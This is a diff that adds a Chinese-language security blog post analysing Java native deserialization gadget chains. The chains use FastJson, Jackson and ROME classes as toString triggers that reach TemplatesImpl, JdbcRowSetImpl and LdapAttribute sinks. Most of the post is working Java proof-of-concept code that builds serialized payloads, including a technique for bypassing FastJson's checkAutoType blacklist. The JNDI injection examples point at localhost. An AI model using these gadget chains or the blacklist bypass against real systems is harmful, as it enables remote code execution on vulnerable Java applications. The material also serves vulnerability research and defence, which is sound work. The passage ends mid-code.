@@ -1,0 +1,465 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="7d38408b02d953eec3a7e899a644a502">前言</h2>
+<p>所谓特殊反序列化，就是指自实现了序列化/反序列化逻辑的组件，本文主要讨论以下三种</p>
+<ul>
+<li>FastJson</li>
+<li>Jackson（SpringBoot原生环境自带）</li>
+<li>ROME（其实并不是特殊反序列化组件，但因为它也经常出现在toString利用链中，故放到一起讨论）</li>
+</ul>
+<p>本文所述攻击的本质是<strong>将上述组件中的类拼接到反序列化利用利用链中，打的是Serilizable入口，而不是特殊反序列化入口</strong></p>
+<p>篇幅有限，无法对上述组件进行详细介绍，请还没了解的读者自行查阅有关文章</p>
+<h2 data-content="1" id="aef32f2b4a5cb375531ee90cff97f4e7">攻击原理</h2>
+<p><strong>这些组件</strong>在实现自己的序列化逻辑（获取对象field值）时，会使用<strong>自身类</strong>重写的<strong>toString</strong>方法</p>
+<p>在<strong>这些类</strong>的toString方法中，会调用<strong>目标类</strong>（也就是放在这些类中的Gadget后半部分，例如TemplatesImpl）的<strong>getter方法</strong>以获取<strong>目标类</strong>对象中的field值</p>
+<p><strong>目标类</strong><code>obj</code>放在<strong>这些类</strong>中</p>
+<p>如  <code>jsonObject1.put("g",obj);</code> <code>ToStringBean toStringBean = new ToStringBean(obj.getClass(),obj);</code></p>
+<p><strong>这些类</strong>包括：<code>FastJson的JSONObject类、Jackson的POJONode类，ROME的ToStringBean类</code></p>
+<p><strong>目标类</strong>getter：<code>TemplatesImpl#getOutputProperties、LdapAttribute#getAttributeDefinition、JdbcRowsetImpl#getDatabaseMetaData</code></p>
+<p>值得一提的是，由于是原生反序列化中的攻击，所以要求利用链上的类都要实现Serilizable接口，因此无法使用BCEL那条链（仅特殊反序列化如FastJson可用）</p>
+<h2 data-content="1" id="f5e77c29b1f4255aaf692311d8f86e07">利用链分析</h2>
+<h3 data-content="1" id="2207a5ca5534ae542ee9dc328ddaf9f1">readObject()-&gt;任意类toString()</h3>
+<h4 data-content="1" id="46ee0926d62b0aa4c76c504edb5f0c75">HotSwappableTargetSource &amp; XString</h4>
+<p><strong>依赖于SpringAOP</strong></p>
+<p>测试代码如下（以JsonObject为例）</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>        
+        <span class="n">Object</span> <span class="n">templatesimpl</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="n">JSONObject</span> <span class="n">jsonObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">();</span>
+        <span class="n">jsonObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"g"</span><span class="o">,</span><span class="s">"m"</span><span class="o">);</span>
+        <span class="n">JSONObject</span> <span class="n">jsonObject1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">();</span>
+        <span class="n">jsonObject1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"g"</span><span class="o">,</span><span class="n">templatesimpl</span><span class="o">);</span>
+
+        <span class="n">HotSwappableTargetSource</span> <span class="n">v1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HotSwappableTargetSource</span><span class="o">(</span><span class="n">jsonObject</span><span class="o">);</span>
+        <span class="n">HotSwappableTargetSource</span> <span class="n">v2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HotSwappableTargetSource</span><span class="o">(</span><span class="k">new</span> <span class="n">XString</span><span class="o">(</span><span class="s">"x"</span><span class="o">));</span>
+
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">v1</span><span class="o">,</span><span class="n">v1</span><span class="o">);</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">v2</span><span class="o">,</span><span class="n">v2</span><span class="o">);</span>
+        <span class="n">setValue</span><span class="o">(</span><span class="n">v1</span><span class="o">,</span><span class="s">"target"</span><span class="o">,</span><span class="n">jsonObject1</span><span class="o">);</span>
+
+<span class="c1">//      用于Reference包裹绕过FastJSon高版本resolveClass黑名单检查,from Y4tacker</span>
+<span class="cm">/*        HashMap&lt;Object,Object&gt; hhhhashMap = new HashMap&lt;&gt;();</span>
+<span class="cm">        hhhhashMap.put(tpl,hashMap);*/</span>
+
+        <span class="n">serialize</span><span class="o">(</span><span class="n">hashMap</span><span class="o">);</span>
+        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span><span class="n">String</span> <span class="n">field</span><span class="o">,</span><span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">field</span><span class="o">);</span>
+        <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">f</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span><span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
+        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
+    <span class="o">}</span>
+</pre></div>
+<p>来看一下调用栈<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017205943-0a548bd0-6ced-1.png"/></p>
+<p>在Xtring#equals方法中，调用了obj2的toString()方法，这个obj2就是<code>HotSwappableTargetSource</code>中和XString对象作比较的<code>templatesimpl</code>对象</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">equals</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj2</span><span class="o">)</span>
+  <span class="o">{</span>
+
+    <span class="k">if</span> <span class="o">(</span><span class="kc">null</span> <span class="o">==</span> <span class="n">obj2</span><span class="o">)</span>
+      <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+
+      <span class="c1">// In order to handle the 'all' semantics of</span>
+      <span class="c1">// nodeset comparisons, we always call the</span>
+      <span class="c1">// nodeset function.</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">obj2</span> <span class="k">instanceof</span> <span class="n">XNodeSet</span><span class="o">)</span>
+      <span class="k">return</span> <span class="n">obj2</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+    <span class="k">else</span> <span class="k">if</span><span class="o">(</span><span class="n">obj2</span> <span class="k">instanceof</span> <span class="n">XNumber</span><span class="o">)</span>
+        <span class="k">return</span> <span class="n">obj2</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+    <span class="k">else</span>
+      <span class="k">return</span> <span class="n">str</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">obj2</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+  <span class="o">}</span>
+</pre></div>
+<h4 data-content="1" id="736d3c35aac6e604a56115454be4e0fc">BadAttributeValueExpException</h4>
+<p><strong>JDK原生可用</strong></p>
+<p>这个就很简单了，<code>BadAttributeValueExpException.readObject()</code>直接走到它里面对象的toString</p>
+<p>代码如下</p>
+<div class="highlight"><pre><span></span><span class="n">Object</span> <span class="n">tpl</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="n">JSONObject</span> <span class="n">jsonObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">();</span>
+        <span class="n">jsonObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"gg"</span><span class="o">,</span><span class="n">tpl</span><span class="o">);</span>
+        <span class="n">BadAttributeValueExpException</span> <span class="n">poc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">Field</span> <span class="n">val</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"javax.management.BadAttributeValueExpException"</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"val"</span><span class="o">);</span>
+        <span class="n">val</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">val</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">poc</span><span class="o">,</span><span class="n">jsonObject</span><span class="o">);</span>
+<span class="c1">//      用于Reference包裹绕过FastJSon高版本resolveClass黑名单检查,from Y4tacker</span>
+<span class="cm">/*        HashMap hashMap = new HashMap();</span>
+<span class="cm">        hashMap.put(tpl,poc);*/</span>
+        <span class="n">serialize</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
+        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
+</pre></div>
+<p><code>BadAttributeValueExpException.readObject()</code></p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span> <span class="n">ois</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">GetField</span> <span class="n">gf</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readFields</span><span class="o">();</span>
+        <span class="n">Object</span> <span class="n">valObj</span> <span class="o">=</span> <span class="n">gf</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"val"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+        <span class="k">if</span> <span class="o">(</span><span class="n">valObj</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">val</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">val</span><span class="o">=</span> <span class="n">valObj</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getSecurityManager</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Long</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Integer</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Float</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Double</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Byte</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Short</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Boolean</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">val</span> <span class="o">=</span> <span class="n">valObj</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span> <span class="c1">//在这里调用了里面对象的toString()方法</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="c1">// the serialized object is from a version without JDK-8019292 fix</span>
+            <span class="n">val</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">identityHashCode</span><span class="o">(</span><span class="n">valObj</span><span class="o">)</span> <span class="o">+</span> <span class="s">"@"</span> <span class="o">+</span> <span class="n">valObj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+ <span class="o">}</span>
+</pre></div>
+<h4 data-content="1" id="627ff798fd13fad14a094f1f0e194f1a">EqualsBean</h4>
+<p><strong>依赖于ROME，在其1.12.0版本前均可用</strong></p>
+<p>代码如下</p>
+<div class="highlight"><pre><span></span><span class="n">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
+        <span class="n">EqualsBean</span> <span class="n">equalsBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">ToStringBean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">toStringBean</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">templatesimpl</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+
+        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">equalsBean</span><span class="o">,</span><span class="s">"123"</span><span class="o">);</span>
+
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">toStringBean</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"obj"</span><span class="o">);</span> <span class="c1">// 低版本（如1.0）此属性名为 _obj</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">toStringBean</span><span class="o">,</span><span class="n">templatesimpl</span><span class="o">);</span>
+        <span class="n">serialize</span><span class="o">(</span><span class="n">hashMap</span><span class="o">);</span>
+        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
+</pre></div>
+<p>调用栈如下<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210100-38300912-6ced-1.png"/></p>
+<p>另外这条链很多地方都可以替换</p>
+<ul>
+<li>由于是在HashMap中调用key.hashCode()作为入口，所以入口类HashMap可以换成Hashtable</li>
+<li>
+<code>ObjectBean.hashCode()</code>中会调用<code>EqualsBean.beanHashCode() = EqualsBean.hashCode()</code>  因此可以用ObjectBean替换EqualsBean</li>
+</ul>
+<h3 data-content="1" id="d7eba1b17ab7e71e4a5c295bd2029060">中间部分</h3>
+<p><code>FastJson的JSONObject类 或 Jackson的POJONode类 或 ROME的ToStringBean类</code>中放好目标类即可</p>
+<h3 data-content="1" id="f4cddddba0f66e6edbe8ae473e4c8591">toString()-&gt;sink</h3>
+<h4 data-content="1" id="3d381879c4278210cd0ae02528ae4e3f">TemplatesImpl#getOutputProperties</h4>
+<p><strong>JDK原生可用</strong></p>
+<p>这条链早在CC和CB中就用到过，故不多作介绍</p>
+<p>三组件均可用，但结合<strong>Rome、Jackson</strong>使用时需要一些特殊处理，详见后文</p>
+<h4 data-content="1" id="e6789c0580d21909218ded23c8b6dbca">JdbcRowSetImpl#getDatabaseMetaData</h4>
+<p><strong>JDK原生可用</strong></p>
+<div class="highlight"><pre><span></span><span class="n">JdbcRowSetImpl</span> <span class="n">jdbcrowsetimpl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JdbcRowSetImpl</span><span class="o">();</span>
+        <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"ldap://127.0.0.1:10990"</span><span class="o">;</span>
+        <span class="n">jdbcRowset</span><span class="o">.</span><span class="na">setDataSourceName</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+</pre></div>
+<p>这条链其实就是FastJson Jdbc链的另一种getter触发方式，效果同样是走到connect()中的lookup实现JNDI注入</p>
+<p>由于组件序列化逻辑问题，<strong>该链仅Rome可用</strong>，原因详见后文</p>
+<h4 data-content="1" id="acbceb1d2a4463b4fb833a5382092902">LdapAttribute#getAttributeDefinition</h4>
+<p><strong>JDK原生可用</strong></p>
+<div class="highlight"><pre><span></span><span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">newInstance</span><span class="o">(</span><span class="s">"com.sun.jndi.ldap.LdapAttribute"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="s">"id"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"baseCtxURL"</span><span class="o">,</span> <span class="s">"ldap://127.0.0.1:13562"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"rdn"</span><span class="o">,</span> <span class="k">new</span> <span class="n">CompositeName</span><span class="o">(</span><span class="s">"whocansee"</span><span class="o">+</span><span class="s">"//b"</span><span class="o">));</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">newInstance</span><span class="o">(</span><span class="n">String</span> <span class="n">classname</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">paramTypes</span><span class="o">,</span> <span class="n">Object</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">InstantiationException</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">getConstructor</span><span class="o">(</span><span class="n">classname</span><span class="o">,</span> <span class="n">paramTypes</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(</span><span class="n">args</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">getConstructor</span><span class="o">(</span><span class="n">String</span> <span class="n">classname</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">paramTypes</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">NoSuchMethodException</span> <span class="o">{</span>
+        <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">ctor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">classname</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">paramTypes</span><span class="o">);</span>
+        <span class="n">ctor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">ctor</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="kd">final</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="kd">final</span> <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">field</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Field</span> <span class="nf">getField</span><span class="o">(</span><span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+            <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+                <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">field</span><span class="o">;</span>
+    <span class="o">}</span>
+</pre></div>
+<p>此链效果：JNDI注入</p>
+<p>由于组件序列化逻辑问题，<strong>Rome不可使用该链</strong>，原因详见后文</p>
+<h2 data-content="1" id="6ccb832189f69ec16f8f177550bea6d3">序列化逻辑分析</h2>
+<p>此部分重点在于分析不同组件<strong>不同的序列化逻辑对利用链选用的影响以及绕过安全检查</strong>，不会每个都跟进一遍序列化流程，感兴趣的师傅可以自己调试</p>
+<h3 data-content="1" id="7e9e18940ba3d8218032fa4596332198">FastJson</h3>
+<h4 data-content="1" id="02f1aa10be50598381da12cc634252da">黑名单检查与绕过</h4>
+<p>了解过FastJson漏洞的师傅一定都知道它的checkAutoType方法，这是其核心防御机制，原本只在FastJson反序列化流程中被触发</p>
+<p>然而到了1.2.49以后，JsonObject类中重写了readObject方法，在resolveClass中会对<strong>目标类</strong>进行checkAutoType检查，本文所述攻击方式会受影响</p>
+<p>参考1ue师傅提出的绕过方法，给<strong>入口类对象和目标类对象套一层</strong>List、Set或Map，以BadAttributeValueExpException入口类为例，代码如下</p>
+<div class="highlight"><pre><span></span><span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+<span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tpl</span><span class="o">,</span><span class="n">poc</span><span class="o">);</span>   
+<span class="n">serialize</span><span class="o">(</span><span class="n">hashMap</span><span class="o">);</span>
+<span class="c1">// tpl即目标类对象（此处为TemplatesImpl类对象） poc即入口类对象（如BadAttributeValueExpException类对象）</span>
+</pre></div>
+<p>从而使得</p>
+<ul>
+<li>序列化时，先给<strong>外层Map中的目标类对象</strong>建立引用映射，再在序列化<strong>JsonObject中的目标类对象</strong>时以引用类型写入目标类对象</li>
+<li>反序列化时，在恢复<strong>JsonObject中的目标类对象</strong>时，因为它是引用类型，所以不会走到resolveClass方法，实现绕过</li>
+</ul>
+<p>至于为什么在恢复引用类型对象时不会调用resolveClass方法，跟进反序列化流程，在此之前有一处判断</p>
+<div class="highlight"><pre><span></span><span class="k">switch</span> <span class="o">(</span><span class="n">tc</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">case</span> <span class="n">TC_NULL</span><span class="o">:</span>
+                    <span class="k">return</span> <span class="n">readNull</span><span class="o">();</span>
+                <span class="k">case</span> <span class="n">TC_REFERENCE</span><span class="o">:</span>
+                    <span class="k">return</span> <span class="n">readHandle</span><span class="o">(</span><span class="n">unshared</span><span class="o">);</span>
+                <span class="k">case</span> <span class="n">TC_CLASS</span><span class="o">:</span>
+                    <span class="k">return</span> <span class="n">readClass</span><span class="o">(</span><span class="n">unshared</span><span class="o">);</span>
+                <span class="k">case</span> <span class="n">TC_CLASSDESC</span><span class="o">:</span>
+                <span class="k">case</span> <span class="n">TC_PROXYCLASSDESC</span><span class="o">:</span>
+                    <span class="k">return</span> <span class="n">readClassDesc</span><span class="o">(</span><span class="n">unshared</span><span class="o">);</span>
+                <span class="k">case</span> <span class="n">TC_STRING</span><span class="o">:</span>
+                <span class="k">case</span> <span class="n">TC_LONGSTRING</span><span class="o">:</span>
+                    <span class="k">return</span> <span class="n">checkResolve</span><span class="o">(</span><span class="n">readString</span><span class="o">(</span><span class="n">unshared</span><span class="o">));</span>
+                <span class="k">case</span> <span class="n">TC_ARRAY</span><span class="o">:</span>
+                    <span class="k">return</span> <span class="n">checkResolve</span><span class="o">(</span><span class="n">readArray</span><span class="o">(</span><span class="n">unshared</span><span class="o">));</span>
+                <span class="k">case</span> <span class="n">TC_ENUM</span><span class="o">:</span>
+                    <span class="k">return</span> <span class="n">checkResolve</span><span class="o">(</span><span class="n">readEnum</span><span class="o">(</span><span class="n">unshared</span><span class="o">));</span>
+                <span class="k">case</span> <span class="n">TC_OBJECT</span><span class="o">:</span>
+                    <span class="k">return</span> <span class="n">checkResolve</span><span class="o">(</span><span class="n">readOrdinaryObject</span><span class="o">(</span><span class="n">unshared</span><span class="o">));</span>
+                <span class="k">case</span> <span class="n">TC_EXCEPTION</span><span class="o">:</span>
+                    <span class="n">IOException</span> <span class="n">ex</span> <span class="o">=</span> <span class="n">readFatalException</span><span class="o">();</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">WriteAbortedException</span><span class="o">(</span><span class="s">"writing aborted"</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
+                <span class="k">case</span> <span class="n">TC_BLOCKDATA</span><span class="o">:</span>
+                <span class="k">case</span> <span class="n">TC_BLOCKDATALONG</span><span class="o">:</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">oldMode</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">bin</span><span class="o">.</span><span class="na">setBlockDataMode</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                        <span class="n">bin</span><span class="o">.</span><span class="na">peek</span><span class="o">();</span>             <span class="c1">// force header read</span>
+                        <span class="k">throw</span> <span class="k">new</span> <span class="n">OptionalDataException</span><span class="o">(</span>
+                            <span class="n">bin</span><span class="o">.</span><span class="na">currentBlockRemaining</span><span class="o">());</span>
+                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                        <span class="k">throw</span> <span class="k">new</span> <span class="n">StreamCorruptedException</span><span class="o">(</span>
+                            <span class="s">"unexpected block data"</span><span class="o">);</span>
+                    <span class="o">}</span>
+                <span class="k">case</span> <span class="n">TC_ENDBLOCKDATA</span><span class="o">:</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">oldMode</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">throw</span> <span class="k">new</span> <span class="n">OptionalDataException</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                        <span class="k">throw</span> <span class="k">new</span> <span class="n">StreamCorruptedException</span><span class="o">(</span>
+                            <span class="s">"unexpected end of block data"</span><span class="o">);</span>
+                    <span class="o">}</span>
+                <span class="k">default</span><span class="o">:</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">StreamCorruptedException</span><span class="o">(</span>
